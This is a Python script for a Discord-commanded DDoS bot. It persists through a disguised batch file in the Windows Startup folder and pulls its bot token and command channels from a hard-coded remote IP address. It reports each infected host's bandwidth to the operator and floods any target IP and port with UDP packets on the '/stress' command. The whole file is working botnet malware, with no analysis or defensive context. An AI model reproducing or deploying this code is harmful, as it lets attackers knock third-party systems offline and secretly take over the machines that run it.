import time
import socket
import random
import math
import requests
import os
import shutil
import sys
from pathlib import Path
def runatstartup():
    if os.name != 'nt':
        return
    else:
        user = os.getlogin()
        startupdir = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % (user)
        selffile = sys.argv[0]
        direc = r'C:\Windows\en-US'
        fulldir = startupdir + '\syshandlr.bat'
        try:
            shutil.copy(selffile, direc)
            f= open(fulldir,"w+")
            fulldirec = direc + "\\" + os.path.basename(sys.argv[0])
            f.write(fulldirec)
            f.close()

        except:
            print(sys.exc_info())
runatstartup()   
#sudo apt-get install discord.py
#sudo python3 -m pip install speedtest-cli
#non built in commands right here
import discord
from discord.ext import commands
import speedtest
token = requests.get('http://207.244.237.196/token.html').text
stressing = 0
def flood(victim, vport, duration):
    global port
    port = vport
    clienta = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    while 1:
        if port == 0:
            vport = random.randrange(1,3000)
        if time.time() > timeout:
            stressing = 0
            break
        else:
            pass
        clienta.sendto(bytes, (victim, vport))
bot = commands.Bot(command_prefix='/')
emoji = requests.get('http://207.244.237.196/emoji.html').text
@bot.event
async def on_ready():
    st = speedtest.Speedtest()
    up = st.upload()
    upp = math.floor(up)
    uppp = upp / 1e+6
    upppp = math.floor(uppp)
    ip = requests.get('https://api.ipify.org/').text
    smsg = 'New bot logged on with ' #+ str(upppp) + ' of hitting power in mbps.' + ' Their public ip is: ' + str(ip)
    chid = int(requests.get('http://207.244.237.196/channelnew.html').text)
    stressinchannel = int(requests.get('http://207.244.237.196/channel.html').text)
    channal = bot.get_channel(chid)
    await channal.send(smsg)
@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if message.content.startswith('/bots'):
        await message.channel.send('1')
    await bot.process_commands(message)
@bot.command()
async def stress(ctx,ip,port,time):
    global stressing
    global stressinchannel
    stre = int(requests.get('http://207.244.237.196/channel.html').text)
    if ctx.channel.id == stre:
        if stressing == 0:
            stressing = stressing + 1
            mest = 'Attempting to hit ' + str(ip) + ' offline'
            flood(str(ip), int(port), int(time))                                                                                                            
        if stressing == 1:
            await ctx.message.add_reaction(emoji)
bot.run(token)



        


